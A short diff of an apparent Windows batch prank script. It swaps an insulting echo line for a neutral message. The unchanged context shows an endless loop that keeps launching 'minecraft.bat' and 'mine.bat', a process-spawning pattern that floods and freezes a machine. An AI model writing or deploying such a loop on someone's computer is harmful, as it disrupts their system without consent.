@@ -2,5 +2,5 @@
 :x
 START minecraft.bat
 START mine.bat
-echo you gay
+echo Well this is fun
 goto x
